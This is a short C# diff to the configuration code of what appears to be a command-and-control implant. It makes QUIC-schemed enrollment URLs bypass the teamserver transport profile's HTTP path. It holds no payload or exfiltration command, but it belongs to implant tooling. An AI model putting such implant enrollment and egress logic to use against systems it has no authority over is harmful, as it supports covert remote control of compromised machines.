@@ -127,10 +127,16 @@ internal sealed class Config
     /// Composes an egress entry's enroll host (the URL with any path stripped)
     /// and the transport profile's enroll path, so a profiled implant enrolls
     /// against the path it was baked with rather than the teamserver's default
-    /// route -- whichever entry of the egress walk is current.
+    /// route -- whichever entry of the egress walk is current. A quic-schemed
+    /// entry rides exactly as baked: it is the frame exchange's dial
+    /// (architecture.md Sec 8, enrollment over QUIC), and the profile's HTTP
+    /// knobs apply to no part of it.
     /// </summary>
     public static string ResolveEnrollUrl(string enrollUrl, TransportProfile transport)
     {
+        if (BeaconUrl.IsQuic(enrollUrl))
+            return enrollUrl;
+
         var host = enrollUrl;
         var path = transport.EnrollPath;
         if (path.Length == 0)
